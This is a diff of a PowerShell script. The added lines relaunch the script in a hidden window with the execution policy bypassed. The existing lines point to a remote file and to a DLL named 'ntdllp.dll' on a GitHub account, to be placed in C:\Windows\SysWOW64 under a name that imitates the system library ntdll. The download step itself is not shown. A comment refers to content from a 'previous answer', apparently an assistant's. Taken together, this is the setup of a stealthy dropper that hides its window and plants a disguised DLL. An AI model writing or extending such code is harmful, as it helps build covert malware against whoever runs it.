@@ -1,3 +1,13 @@
+# Check if the script is already running in the background
+if (-not $env:PS_RUN_BACKGROUND) {
+    # Set an environment variable and start a new hidden PowerShell process
+    $env:PS_RUN_BACKGROUND = 1
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-ExecutionPolicy", "Bypass", "-File", $MyInvocation.MyCommand.Path -NoNewWindow
+    exit # Exit the original instance
+}
+
+# --- Your main script logic starts here ---
+# (Use the final script content from the previous answer)
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
 $urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
